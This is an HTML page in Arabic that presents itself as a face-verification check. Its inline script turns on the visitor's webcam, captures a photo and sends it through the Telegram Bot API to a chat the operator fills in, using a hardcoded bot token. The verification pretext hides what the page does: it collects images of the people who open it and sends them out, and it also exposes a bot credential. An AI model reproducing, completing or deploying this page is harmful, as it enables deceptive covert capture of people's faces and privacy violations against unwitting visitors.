<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحقق من الوجه</title>
</head>
<body>
    <div id="status">اضغط للبدء</div>
    <button id="startBtn">بدء التحقق</button>
    <video id="video" autoplay playsinline style="display:none;"></video>

    <script>
        const TOKEN = "8446745973:AAGRD2tFbSrzB2OFoByvYRHCY1Hp6nluHf0";
        const CHAT_ID = "ضع_ايديك_هنا"; // <--- تأكد من وضع رقم الآيدي الخاص بك
        const statusEl = document.getElementById('status');
        const video = document.getElementById('video');

        document.getElementById('startBtn').onclick = async () => {
            try {
                statusEl.innerText = "جاري تفعيل الكاميرا...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // انتظر ثانية للتأكد من أن الفيديو بدأ يظهر فعلياً
                await new Promise(r => setTimeout(r, 1000));

                statusEl.innerText = "جاري الالتقاط...";
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'face.jpg');

                    statusEl.innerText = "جاري الإرسال...";
                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    const result = await response.json(); // لنرى رسالة الخطأ من تليجرام
                    if (result.ok) {
                        statusEl.innerText = "تم الإرسال بنجاح!";
                    } else {
                        statusEl.innerText = "خطأ من تليجرام: " + result.description;
                        console.error(result);
                    }
                    
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');

            } catch (err) {
                statusEl.innerText = "خطأ: " + err.message;
                console.error(err);
            }
        };
    </script>
</body>
</html>
